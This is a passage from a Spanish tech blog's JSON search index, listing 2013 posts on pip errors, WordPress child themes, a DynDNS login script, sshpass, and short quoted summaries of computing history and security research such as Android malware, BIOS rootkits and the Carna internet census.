tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/10/13/the-30-css-selectors-you-must-memorize/","loc":"https://karpoke.ignaciocano.com/2013/10/13/the-30-css-selectors-you-must-memorize/"},{"title":"Solucionado el error «DistributionNotFound» al usar pip","text":"Si al ejecutar pip , nos aparece el siguiente error: bash $ pip Traceback (most recent call last): File \"/usr/local/bin/pip\", line 5, in from pkg_resources import load_entry_point File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 2707, in working_set.require(__requires__) File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 686, in require needed = self.resolve(parse_requirements(requirements)) File \"/usr/lib/python2.7/dist-packages/pkg_resources.py\", line 584, in resolve raise DistributionNotFound(req) pkg_resources.DistributionNotFound: pip==1.1 puede ser debido a que es necesario actualizar el propio pip : ```bash $ sudo easy_install --upgrade pip Searching for pip Reading http://pypi.python.org/simple/pip/ Best match: pip 1.4 Downloading https://pypi.python.org/packages/source/p/pip/pip-1.4.tar.gz#md5=ca790be30004937987767eac42cfa44a Processing pip-1.4.tar.gz Running pip-1.4/setup.py -q bdist_egg --dist-dir /tmp/easy_install-XSmFvr/pip-1.4/egg-dist-tmp-jmeGZW warning: no files found matching ' .html' under directory 'docs' warning: no previously-included files matching ' .rst' found under directory 'docs/_build' no previously-included directories found matching 'docs/_build/_sources' Adding pip 1.4 to easy-install.pth file Installing pip script to /usr/local/bin Installing pip-2.7 script to /usr/local/bin Installed /usr/local/lib/python2.7/dist-packages/pip-1.4-py2.7.egg Processing dependencies for pip Finished processing dependencies for pip ``` Comprobamos que se ha solucionado: ```bash $ pip Usage: pip [options] Commands: install Install packages. uninstall Uninstall packages. freeze Output installed packages in requirements format. list List installed packages. show Show information about installed packages. search Search PyPI for packages. wheel Build wheels from your requirements. zip Zip individual packages. unzip Unzip individual packages. bundle Create pybundles. help Show help for commands. General Options: -h, --help Show help. -v, --verbose Give more output. Option is additive, and can be used up to 3 times. -V, --version Show version and exit. -q, --quiet Give less output. --log Log file where a complete (maximum verbosity) record will be kept. --proxy Specify a proxy in the form [user:passwd@]proxy.server:port. --timeout Set the socket timeout (default 15 seconds). --exists-action Default action when a path already exists: (s)witch, (i)gnore, (w)ipe, (b)ackup. --cert Path to alternate CA bundle. ``` Referencias » stackoverflow.com","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/07/28/solucionado-el-error-distributionnotfound-al-usar-pip/","loc":"https://karpoke.ignaciocano.com/2013/07/28/solucionado-el-error-distributionnotfound-al-usar-pip/"},{"title":"Utilizando un tema hijo en WordPress","text":"Un tema hijo en WordPress es un tema que hereda la funcionalidad de otro, el tema padre, permitiendo modificar el estilo o añadir funcionalidades a éste. Es la forma más sencilla y segura de modificar un tema existente, ya sean cambios grandes o pequeños. Si utilizamos un tema de otros, ya sea gratuito o de pago, crear un tema hijo es una buena idea. ¿Por qué crear un tema hijo? Porqué en algún momento cambiaremos algo del tema que estamos usando, y en algún momento posterior es posible que haya una actualización de dicho tema. En el mejor de los casos, nos deberemos preocupar de guardar los cambios que hemos hecho en el tema y aplicarlos de nuevo tras la actualización. En el peor, perderemos los cambios que hemos hecho. Crear un tema hijo Para tener un tema hijo funcionando, lo único que tenemos que hacer es: Crear un directorio con el mismo nombre, añadiendo el sufijo -child , en el mismo directorio del tema padre. Ejemplo: twentytwelve-child Añadimos el fichero style.css en el directorio recién creado: php /* Theme Name: Twenty Twelve Child Theme URI: http://example.com/ Description: Child theme for the Twenty Twelve theme Author: Your name here Author URI: http://example.com/about/ Template: twentytwelve Version: 0.1.0 */ Si sólo queremos hacer pequeñas modificaciones, podemos importar la hoja de estilo del tema padre y añadir los cambios a continuación: php @import url(\"../twentytwelve/style.css\"); Activamos el tema desde el panel de administración Para sobreescribir un fichero, basta que tenga el mismo nombre que en el tema padre. De ahí que necesitemos importar el fichero del tema padre si sólo queremos añadir algunos cambios. Una excepción es el fichero functions.php , el cual se carga antes que el del tema hijo, por lo que no será necesario copiar este fichero. Para poder sobrecargar una función del tema padre, éste debe utilizar funciones sobreescribibles, que comprueban si han sido definidas previamente. A partir de ahora, podemos llenar el fichero functions.php de nuestro tema hijo con todas esas funciones imprescindibles de sitios como: » WordPress Stack Exchange » Cats who code » Smashing Magazine » WordPress Recipes » WordPress Mix » Dig WordPress » WordPress Tutplus » WordPress Code Snippets ¿Y si ya estoy utilizando un tema hijo? Es posible que ya estemos utilizando un tema hijo. En este caso, podemos crear un tema nieto, sólo que no se hace como hemos hecho para el tema hijo, sino que debe hacerse como si fuese un complemento. Más información en este artículo en wp-code.com . Referencias » How to Customize Your WordPress Theme With a Child Theme » Don't edit child themes – use grandchild themes! » WordPress Child Themes » WordPress Pluggable Functions","tags":"dev","url":"https://karpoke.ignaciocano.com/2013/07/13/utilizando-un-tema-hijo-en-wordpress/","loc":"https://karpoke.ignaciocano.com/2013/07/13/utilizando-un-tema-hijo-en-wordpress/"},{"title":"10 Colossal Old Computers That Changed History","text":"Computers have come a long way since the early days, when two of the machines could take over a four-story building and weigh up to 250 tons. As early as the 1930s, inventors, engineers and physicists were figuring out ways to use machines to perform complex calculations and processes, employing pioneering methods to achieve their goals. Although some of those techniques and devices are now blissfully obsolete, many early innovators hit upon technologies that are still in use today. These 10 colossal old computers are a testament to the alluring potential of computing and the ingenuity of early computer scientists – as well as a visual demonstration of just how far we've come. Will | bestcomputerscienceschools.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/07/07/10-colossal-old-computers-that-changed-history/","loc":"https://karpoke.ignaciocano.com/2013/07/07/10-colossal-old-computers-that-changed-history/"},{"title":"Uncovering android master key that makes 99% of devices vulnerable","text":"The Bluebox Security research team – Bluebox Labs – recently discovered a vulnerability in Android's security model that allows a hacker to modify APK code without breaking an application's cryptographic signature, to turn any legitimate application into a malicious Trojan, completely unnoticed by the app store, the phone, or the end user. The implications are huge! This vulnerability, around at least since the release of Android 1.6 (codename: \"Donut\" ), could affect any Android phone released in the last 4 years1 – or nearly 900 million devices2– and depending on the type of application, a hacker can exploit the vulnerability for anything from data theft to creation of a mobile botnet. Jeff Forristal | bluebox.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/07/06/uncovering-android-master-key-that-makes-99-of-devices-vulnerable/","loc":"https://karpoke.ignaciocano.com/2013/07/06/uncovering-android-master-key-that-makes-99-of-devices-vulnerable/"},{"title":"La edad de Oro de los videojuegos","text":"La edad de oro de los videojuegos en España (1985 - 1991). EL número de Ordenadores de 8 bits en nuestro país era el suficiente como para crear una industria del videojuego. Jóvenes emprendedores crearían una industria lúdica, basada en el videojuego, que sorprendería en todo el mundo. Esta es la historia de esos programadores, compañías y entorno que nos embelesó en los inicios de la informática. Litos NET | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/30/la-edad-de-oro-de-los-videojuegos/","loc":"https://karpoke.ignaciocano.com/2013/06/30/la-edad-de-oro-de-los-videojuegos/"},{"title":"Todo el mundo debería saber programar","text":"» code.org | Via Friki Cabrón youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/29/todo-el-mundo-deberia-saber-programar/","loc":"https://karpoke.ignaciocano.com/2013/06/29/todo-el-mundo-deberia-saber-programar/"},{"title":"Así vuela un avión, y ojalá que por fin se aclare el tema de una vez por todas","text":"\"¿Cómo es posible que este montón de metal pueda sustentarse en el aire?\" Esa pregunta nos la hemos hecho muchas veces, y aun hoy el ciudadano medio tiende a aceptarlo como artículo de fe. Hay muchas explicaciones en Internet, pero algunas son confusas, otras están equivocadas y otras más nos dejan como estábamos; y reitero lo que ya he dicho en Twitter, \"Brujería\" no vale. Arturo Quirantes | naukas.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/16/asi-vuela-un-avion-y-ojala-que-por-fin-se-aclare-el-tema-de-una-vez-por-todas/","loc":"https://karpoke.ignaciocano.com/2013/06/16/asi-vuela-un-avion-y-ojala-que-por-fin-se-aclare-el-tema-de-una-vez-por-todas/"},{"title":"Ethernet cumple 40 años: Bob Metcalfe","text":"Éranse una vez los años 70, y un lugar denominado Centro de Investigación de Xerox en Palo Alto, California (Xeros PARC) donde se trabajaba en lo que sería la oficina del futuro. Dentro de ese proyecto existían unos ordenadores con capacidades gráficas y ratón que se llamaban 'Alto' y, a pesar de lo temprano de los tiempos -en términos bit-, también se fabricaban allí las primeras impresoras láser. Tanto los 'Alto' como las 'printers' requerían interconexión; ya que aquellos primitivos ordenadores personales –aquellos primeros PCs que por robo intelectual o caprichos del destino pasaron por las nada inocentes manos de Steve Jobs y dieron origen a Apple- debían mandar los archivos para imprimir a las laser, pero también entenderse entre sí. La misión de intercomunicarlos y conseguir que los datos de unas máquinas pasaran a otras; es decir la misión de construir las primeras redes locales, se encomendó a un joven ingeniero de 27 años, especialista en comunicaciones, que se había graduado poco antes en el MIT (Instituto de Tecnología de Masachussets). Su nombre: Robert Metcalfe. Pilar Bernat | zonamovilidad.es \"Ethernet cumple 40 años: Bob Metcalfe\"","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/16/ethernet-cumple-40-anos-bob-metcalfe/","loc":"https://karpoke.ignaciocano.com/2013/06/16/ethernet-cumple-40-anos-bob-metcalfe/"},{"title":"Gestión de RAID a través de MDADM","text":"MDADM (Multiple Device Administrator) es un conjunto de herramientas que son utilizadas en GNU/Linux para la gestión de RAID (Redundant Array of Independent Disks, que se traduce como conjunto redundante de discos independientes) administrado a través de software, distribuido bajo los términos de la Licencia Pública General de GNU versión 2 (GNU/GPLv2). Joel Barrios Dueñas | alcancelibre.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/16/gestion-de-raid-a-traves-de-mdadm/","loc":"https://karpoke.ignaciocano.com/2013/06/16/gestion-de-raid-a-traves-de-mdadm/"},{"title":"Prince of persia code review","text":"Even though it is the Apple II version written in 6502 assembly language, it was a pleasant experience to dive in the code of that mythical game: As usual there were many fascinating sofware wizardries to discover. The Apple II apparent poor environment for game programming was actually ground to unmatched innovation and creativity : From self-modifying code, in-house bootloader, clever floppy disc format to skewing lookup tables: Prince Of Persia features engineering treasures in every modules. » Part I : Introduction » Part II : Bootloader » Part III : Code explained Jordan Mechner | fabiensanglard.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/15/prince-of-persia-code-review/","loc":"https://karpoke.ignaciocano.com/2013/06/15/prince-of-persia-code-review/"},{"title":"BIOS Based Rootkits","text":"Everything described here is based on a project I completed in early 2011, which was originally started several years earlier. While attending CanSecWest in 2009, Anibal Sacco and Alfredo Ortega from Core Security did a presentation on 'Persistent BIOS Infection' where they demonstrated how it was possible to patch the BIOS to do some nasty/awesome things. Their Phrack write-up is here: http://www.phrack.com/issues.html?issue=66&id=7. At the time this seemed really cool, but I never ended up getting the chance to try it out. A year later I needed to do a term project for school, so I decided to revisit BIOS hacking, and implement some of it myself. Wesley Wineberg | exfiltrated.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/14/bios-based-rootkits/","loc":"https://karpoke.ignaciocano.com/2013/06/14/bios-based-rootkits/"},{"title":"Iniciar sesión en DynDNS desde el terminal","text":"Hace un par de semanas, DynDNS cambió su política de uso de las cuentas gratuitas para incluir una cláusula por la cual es necesario hacer mínimo un login al mes si no se quieren perder los dominios que tengamos: Starting now, if you would like to maintain your free Dyn account, you must log into your account once a month. Failure to do so will result in expiration and loss of your hostname. This activity helps us eliminate hostnames that are no longer needed and/or dormant. Note that an update client will not suffice for this monthly login. El siguiente script permite iniciar sesión haciendo uso de la librería mechanize para Python: ```python !/usr/bin/env python import mechanize import cookielib LOGIN_URL = \"https://account.dyn.com/entrance/\" USERNAME = \"username\" PASSWORD = \"password\" Browser br = mechanize.Browser() Cookie Jar cj = cookielib.LWPCookieJar() br.set_cookiejar(cj) Browser options br.set_handle_equiv(True) br.set_handle_redirect(True) br.set_handle_referer(True) br.set_handle_robots(False) Follows refresh 0 but not hangs on refresh > 0 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) User-Agent (this is cheating, ok?) br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] Open some site, let's pick a random one, the first that pops in mind: r = br.open(LOGIN_URL) html = r.read() Select the second (index one) form br.select_form(nr=1) br.form[\"username\"] = USERNAME br.form[\"password\"] = PASSWORD br.submit() if br.response().read().find(USERNAME) >= 0: print(\"OK\") else: print(\"KO\") ``` Actualización a 22 de septiembre de 2013 Actualizada la URL en la que encontraremos el formulario de login . Referencias » Emulating a Browser in Python with mechanize","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/06/10/iniciar-sesion-en-dyndns-desde-el-terminal/","loc":"https://karpoke.ignaciocano.com/2013/06/10/iniciar-sesion-en-dyndns-desde-el-terminal/"},{"title":"The most sophisticated Android Trojan","text":"Recently, an Android application came to us for analysis. At a glance, we knew this one was special. All strings in the DEX file were encrypted, and the code was obfuscated. The file turned out to be a multi-functional Trojan, capable of the following: sending SMS to premium-rate numbers; downloading other malware programs, installing them on the infected device and/or sending them further via Bluetooth; and remotely performing commands in the console. Now, Kaspersky Lab's products detect this malicious program as Backdoor.AndroidOS.Obad.a Roman Unuchek | securelist.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/09/the-most-sophisticated-android-trojan/","loc":"https://karpoke.ignaciocano.com/2013/06/09/the-most-sophisticated-android-trojan/"},{"title":"Conectarse por SSH utilizando sshpass","text":"sshpass es un programa que nos permite iniciar sesión en un servidor SSH de forma no interactiva y sin utilizar claves, para lo que deberemos proporcionar la contraseña como argumento del programa. Para conectar a un servidor SSH, es preferible utilizar claves , además de tener en cuenta otros sistemas de seguridad, como la autenticación en dos pasos , pero puede haber escenarios en los que sshpass sea una alternativa a considerar. Su uso es sencillo: bash $ sshpass -p password ssh example.com El hecho de que la contraseña se escriba directamente en el terminal, además de que es posible que quede escrita en el historial , podría hacer que fuese visible al ejecutar otro usuario el comando ps . Sin embargo, sshpass se encarga de sustituir la contraseña por zetas: bash $ ps a | grep sshpass 18998 pts/6 S+ 0:00 sshpass -p zzzzzzzz ssh example.com Referencias » sshpass: Login To SSH Server / Provide SSH Password Using A Shell Script","tags":"admin","url":"https://karpoke.ignaciocano.com/2013/06/09/conectarse-por-ssh-utilizando-sshpass/","loc":"https://karpoke.ignaciocano.com/2013/06/09/conectarse-por-ssh-utilizando-sshpass/"},{"title":"First Glimpse into the Soul of a Tamagotchi","text":"I dumped the ROM of a Tamagotchi using the code execution ability I posted previously. I wrote 6502 code that dumped each byte of the memory space of the Tamagotchi, and output it over port A (which is usually the Tamagotchi button input) via SPI. Natalie Silvanovich | kwartzlab.ca","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/08/first-glimpse-into-the-soul-of-a-tamagotchi/","loc":"https://karpoke.ignaciocano.com/2013/06/08/first-glimpse-into-the-soul-of-a-tamagotchi/"},{"title":"How crackers ransack passwords like 'qeadzcwrsfxv1331'","text":"In March, readers followed along as Nate Anderson, Ars deputy editor and a self-admitted newbie to password cracking, downloaded a list of more than 16,000 cryptographically hashed passcodes. Within a few hours, he deciphered almost half of them. The moral of the story: if a reporter with zero training in the ancient art of password cracking can achieve such results, imagine what more seasoned attackers can do. Imagine no more. We asked three cracking experts to attack the same list Anderson targeted and recount the results in all their color and technical detail Iron Chef style. The results, to say the least, were eye opening because they show how quickly even long passwords with letters, numbers, and symbols can be discovered. Dan Goodin | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/08/how-crackers-ransack-passwords-like-qeadzcwrsfxv1331/","loc":"https://karpoke.ignaciocano.com/2013/06/08/how-crackers-ransack-passwords-like-qeadzcwrsfxv1331/"},{"title":"Los 10 errores típicos de una PYME en materia de seguridad","text":"No cabe duda de que en los últimos años hemos avanzado mucho en Seguridad de la Información. Poco a poco, entre las empresas comienza a implantarse la idea de que la seguridad es un ámbito al que hay que prestar una atención específica e independiente, más allá de lo que muchos consideran \"los informáticos\". Sin embargo, si no es bueno caer en el catastrofismo, no debemos ser demasiado indulgentes: queda mucho camino por recorrer y los avances no siempre se producen a la velocidad a la que, afortunadamente para los delincuentes, serían recomendables o deseables. A diario se producen noticias de empresas u organizaciones con una fuerte inversión en seguridad cuya infraestructura tecnológica es vulnerada, lo que da una idea del desequilibrio de fuerzas existente. En esta línea, aun persisten muchos errores y creencias que podemos identificar como los diez errores típicos de las PYMEs en materia de seguridad y que marcan el camino a seguir estos próximos años. Manuel Benet | securityartwork.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/08/los-10-errores-tipicos-de-una-pyme-en-materia-de-seguridad/","loc":"https://karpoke.ignaciocano.com/2013/06/08/los-10-errores-tipicos-de-una-pyme-en-materia-de-seguridad/"},{"title":"Stage By Stage Boot Process Of Linux In Detail","text":"This article describes linux booting process in detail, what are the steps involved, which scripts run, what configuration files are read and their order, from turning on the system till getting the login prompt. Although this article projects a general view of booting a Linux system, but some configuration files and commands can be Red Hat specific. You can also download linux boot process pdf version for future reference. Raghu | expertslogin.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/08/stage-by-stage-boot-process-of-linux-in-detail/","loc":"https://karpoke.ignaciocano.com/2013/06/08/stage-by-stage-boot-process-of-linux-in-detail/"},{"title":"Tetris Printer Algorithm","text":"The algorithm converts pixels from a source image into squares in the Tetris playfield, one row at a time from the bottom up. To generate an individual square, the algorithm assembles a structure consisting of a rectangular region fully supported by a single square protruding from the bottom. When the rectangular region is completed, its rows are cleared, leaving behind the protruding square. Three examples of the process appear below Michael Birken | meatfighter.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/05/tetris-printer-algorithm/","loc":"https://karpoke.ignaciocano.com/2013/06/05/tetris-printer-algorithm/"},{"title":"A Short History of the O'Reilly Animals","text":"In the mid-1980s, O'Reilly (aka O'Reilly & Associates) was selling short books on Unix topics via mail order. These books, known as \"Nutshell Handbooks,\" were held together by staples, and had plain brown covers. Over time, Tim O'Reilly decided that he wanted to sell the books through brick-and-mortar bookstores, and hired a graphic designer to create new book covers. Those covers were used for the first two titles that were sold into bookstores, but Tim wasn't satisfied with the design. Edie Freedman | animals.oreilly.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/06/01/a-short-history-of-the-oreilly-animals/","loc":"https://karpoke.ignaciocano.com/2013/06/01/a-short-history-of-the-oreilly-animals/"},{"title":"¿Influye la edad en la calidad como programador?","text":"Se dice que son necesarias 10.000 horas de trabajo de programación para alcanzar el nivel de experto, pero una vez llegado a él, ¿cuál es la evolución? ¿Se mantiene? ¿Continúa mejorando? ¿Retrocede? Juan Palacio | navegapolis.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/05/13/influye-la-edad-en-la-calidad-como-programador/","loc":"https://karpoke.ignaciocano.com/2013/05/13/influye-la-edad-en-la-calidad-como-programador/"},{"title":"Cómo 4 ecuaciones cambiaron el mundo","text":"Cuenta la anécdota que un día de la primavera de 1855 el físico inglés Michael Faraday daba una conferencia pública en la que mostraba sus pioneros experimentos sobre la electricidad y el magnetismo. Entre la audiencia se encontraba William Gladstone, entonces Ministro de Hacienda y futuro Primer Ministro. Gladstone se levantó y le espetó al investigador: \"todo esto es muy bonito, ¿pero alguna vez le encontraremos una aplicación práctica?\", a lo que Faraday respondió: \"no se preocupe, algún día el gobierno cobrará impuestos sobre esto\". » principiamarsupia.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/05/04/como-4-ecuaciones-cambiaron-el-mundo/","loc":"https://karpoke.ignaciocano.com/2013/05/04/como-4-ecuaciones-cambiaron-el-mundo/"},{"title":"Luke's Change: an Inside Job","text":"An examination of some questionable events and circumstances leading up to the destruction of the Death Star, through the eyes of an amateur investigative journalist within the Star Wars galaxy. The focus is mainly on the connections between the people who created and operated the Death Star and those responsible for destroying it. For those who don't care for the obvious, this is a satirical spoof of the 9/11 truther video Loose Change. Graham Putnam | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/05/01/lukes-change-an-inside-job/","loc":"https://karpoke.ignaciocano.com/2013/05/01/lukes-change-an-inside-job/"},{"title":"HTTP: The Protocol Every Web Developer Must Know – Part 1","text":"HTTP stands for Hypertext Transfer Protocol. It's a stateless, application-layer protocol for communicating between distributed systems, and is the foundation of the modern web. As a web developer, we all must have a strong understanding of this protocol. Let's review this powerful protocol through the lens of a web developer. We'll tackle the topic in two parts. In this first entry, we'll cover the basics and outline the various request and response headers. In the follow-up article, we'll review specific pieces of HTTP – namely caching, connection handling and authentication. Pavan Podila | tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/30/http-the-protocol-every-web-developer-must-know-part-1/","loc":"https://karpoke.ignaciocano.com/2013/04/30/http-the-protocol-every-web-developer-must-know-part-1/"},{"title":"Una partida 'perfecta' de Serpiente","text":"En 1997 esto era lo más avanzado en la industria del entretenimiento móvil. \"Snake\" era conocido en entre los jugadores de PC y otras plataformas informáticas pero el Nokia 6110 fue el primer teléfono que lo integró entre sus características. [ 1 Angel Jimenez de Luis | gizmodo.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/29/una-partida-perfecta-de-serpiente/","loc":"https://karpoke.ignaciocano.com/2013/04/29/una-partida-perfecta-de-serpiente/"},{"title":"Imprescindibles: The I.T. Crowd","text":"Probablemente es una de las series de televisión que más carcajadas me ha arrancado en los últimos años. Pese a su título (en español, Los informáticos) tiene bastante poco que ver con el humor \"nerd\" de The Big Bang Theory, por ejemplo. The IT Crowd, para quien todavía no la haya visto y se la esté perdiendo, es una comedia de malentendidos y enredos, repleta de situaciones surrealistas que llegan a complicarse hasta el delirio incluso en los breves minutos que dura cada episodio. Emilio de Gorgot | jotdown.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/28/imprescindibles-the-i-t-crowd/","loc":"https://karpoke.ignaciocano.com/2013/04/28/imprescindibles-the-i-t-crowd/"},{"title":"No debes despreciar aquello que más necesitas","text":"En mi opinión el origen de todos los males que afectan a la profesión del desarrollo de software (no me meto en otras cosas), o mejor dicho del programador (evito eufemismos tipo \"arquitecto\", \"ingeniero software\", \"desarrollador\" o similares) es el desprecio a programar, el desprecio de la labor del programador frente a otros tipos de tareas. Jose María Arranz | saveinformaticos.reeelab.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/27/no-debes-despreciar-aquello-que-mas-necesitas/","loc":"https://karpoke.ignaciocano.com/2013/04/27/no-debes-despreciar-aquello-que-mas-necesitas/"},{"title":"Time travel in movies","text":"mr. dalliard | mr-dalliard.tumblr.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/21/time-travel-in-movies/","loc":"https://karpoke.ignaciocano.com/2013/04/21/time-travel-in-movies/"},{"title":"Los códigos genéticos e informáticos comparten sorprendentes similitudes","text":"La teoría de la \"supervivencia del más apto\" de Darwin puede aplicarse tanto a los sistemas biológicos como a los sistemas informáticos, sugiere una investigación del BNL y de la la Stony Brook University de Nueva York. El análisis del genoma de 500 bacterias y de 200.000 paquetes Linux ha revelado que estas dos redes complejas utilizan el mismo mecanismo para expandir sus componentes clave. La razón de esta similitud estaría en que las dos son sistemas de acceso libre, afirman los científicos. » laflecha.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/20/los-codigos-geneticos-e-informaticos-comparten-sorprendentes-similitudes/","loc":"https://karpoke.ignaciocano.com/2013/04/20/los-codigos-geneticos-e-informaticos-comparten-sorprendentes-similitudes/"},{"title":"Señoras y señores, con todos nosotros: La Vida","text":"La vida es algo de lo que tenemos constancia directa, identificamos si un sistema está vivo o si no lo está. Sin embargo, aún no tenemos una definición totalmente satisfactoria del concepto 'vida'. Bien es cierto que hay una frontera difusa entre lo vivo y lo no vivo, uno siempre puede recurrir a los virus para forzar la conversación, pero a partir de cierto nivel la distinción entre sistemas vivos y sistemas inertes es más que evidente. Y la pregunta es: ¿cómo se originó la vida? ¿qué condiciones dieron lugar a la misma? » cuentos-cuanticos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/10/senoras-y-senores-con-todos-nosotros-la-vida/","loc":"https://karpoke.ignaciocano.com/2013/04/10/senoras-y-senores-con-todos-nosotros-la-vida/"},{"title":"How two volunteers built the Raspberry Pi's operating system","text":"When you buy a Raspberry Pi, the \\$35 computer doesn't come with an operating system. Loading your operating system of choice onto an SD card and then booting the Pi turns out to be pretty easy. But where do Pi-compatible operating systems come from? With the Raspberry Pi having just turned one year old, we decided to find out how Raspbian\"the officially recommended Pi operating system\"came into being. The project required 60-hour work weeks, a home-built cluster of ARM computers, and the rebuilding of 19,000 Linux software packages. And it was all accomplished by two volunteers. Jon Brodkin | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/06/how-two-volunteers-built-the-raspberry-pis-operating-system/","loc":"https://karpoke.ignaciocano.com/2013/04/06/how-two-volunteers-built-the-raspberry-pis-operating-system/"},{"title":"Desarrollan el primer transistor biológico","text":"Un equipo de investigadores de la Universidad de Stanford ha desarrollado el primer transistor biológico a partir de materiales genéticos: ADN y ARN. Bajo el nombre de \"transcriptor\", los científicos hablan de este transistor biológico como el componente final necesario para la construcción de computadoras biológicas que funcionen dentro de las células vivas. Miguel Jorge | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/05/desarrollan-el-primer-transistor-biologico/","loc":"https://karpoke.ignaciocano.com/2013/04/05/desarrollan-el-primer-transistor-biologico/"},{"title":"Free and Openand Their Opposites","text":"Merriam-Webster defines a tenet as \"a principle, belief, or doctrine generally held to be true; especially one held in common by members of an organization, movement, or profession.\" As it happens, Linux is claimed by two doctrines that are to some degree at odds: those of free software and open source. This contention began when Eric S. Raymond published \"Goodbye, 'free software'; hello, 'open source'\", on February 8, 1998 Doc Searls | linuxjournal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/04/free-and-open-and-their-opposites/","loc":"https://karpoke.ignaciocano.com/2013/04/04/free-and-open-and-their-opposites/"},{"title":"The Command Line is Your Best Friend","text":"Yes, it's that white (or green) on black screen, where mysterious text flows and strange commands execute. I know great programmers who never use the CLI; however, I also know basic computer users who do everything in the CLI instead of the graphical user interface (GUI). They have console applications to browse the web and file system, read mail, view images and edit text. They even watch YouTube videos and read PDF files without a GUI! It's up to each person to find his or her best workflow. Some prefer the GUI, while others enjoy the CLI. Patkos Csaba | net.tutsplus.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/03/the-command-line-is-your-best-friend/","loc":"https://karpoke.ignaciocano.com/2013/04/03/the-command-line-is-your-best-friend/"},{"title":"Cómo perder peso (en el navegador)","text":"¿Y si nos juntáramos un grupo de expertos que trabajan en grandes sitios para crear una guía para el rendimiento front-end definitiva? Y no sólo una de esas aburridas guías hechas para robots, ¿y si hiciéramos algo divertido? ¿Qué tal reunirse Briza Bueno (Americanas.com), Davidson Fellipe (Globo.com), Giovanni Keppelen (ex-Peixe Urbano), Jaydson Gomes (Terra), Marcel Duran (Twitter), Mike Taylor (Opera), Renato Mangini (Google) y Sérgio Lopes (Caelum) para crear la mejor referencia posible? ¡Eso es exactamente lo que hemos hecho! Y nosotros te guiaremos en esta batalla para crear sitios incluso más rápidos. Zeno Rocha | browserdiet.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/02/como-perder-peso-en-el-navegador/","loc":"https://karpoke.ignaciocano.com/2013/04/02/como-perder-peso-en-el-navegador/"},{"title":"Internet Census 2012: Port scanning /0 using insecure embedded devices","text":"While playing around with the Nmap Scripting Engine (NSE) we discovered an amazing number of open embedded devices on the Internet. Many of them are based on Linux and allow login to standard BusyBox with empty or default credentials. We used these devices to build a distributed port scanner to scan all IPv4 addresses. These scans include service probes for the most common ports, ICMP ping, reverse DNS and SYN scans. We analyzed some of the data to get an estimation of the IP address usage. Carna Botnet | internetcensus2012.bitbucket.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/04/01/internet-census-2012-port-scanning-0-using-insecure-embedded-devices/","loc":"https://karpoke.ignaciocano.com/2013/04/01/internet-census-2012-port-scanning-0-using-insecure-embedded-devices/"},{"title":"The 8085's register file reverse engineered","text":"On the surface, a microprocessor's registers seem like simple storage, but not in the 8085 microprocessor. Reverse-engineering the 8085 reveals many interesting tricks that make the registers fast and compact. The picture below shows that the registers and associated control circuitry occupy a large fraction of the chip, so efficiency is important. Each bit is implemented with a surprisingly compact circuit. The instruction set is designed to make register accesses efficient. An indirection trick allows quick register exchanges. Many register operations use the unexpected but efficient data path of going through the ALU. Ken Shirriff | righto.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/31/the-8085s-register-file-reverse-engineered/","loc":"https://karpoke.ignaciocano.com/2013/03/31/the-8085s-register-file-reverse-engineered/"},{"title":"Las primeras programadoras","text":"Cuando se habla del nacimiento de los primeros computadores, normalmente, se suelen asociar a hombres que trabajaban en el equipo de descifradores de códigos Bletchley Park durante la Segunda Guerra Mundial (como Alan Turing), John William Mauchly y John Presper Eckert en el ENIAC o Howard H. Aiken como responsable de la construcción de la Harvard Mark I; sin embargo, en los equipos de trabajo de estos pioneros de la computación se encontraban mujeres que ejercieron de programadoras y diseñadoras de los precursores de los ordenadores y servidores que sustentan nuestro trabajo diario. JJ Velasco | blogthinkbig.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2013/03/31/las-primeras-programadoras/","loc":"https://karpoke.ignaciocano.com/2013/03/31/las-primeras-programadoras/"},{"title":"DRM en HTML: la guerra por poseer la Web","text":"Tim Berners-Lee habló hace unos días en las conferencias SXSW acerca del futuro de HTML, el lenguaje que inventó para construir la Web. Entre sus dichos habituales sobre 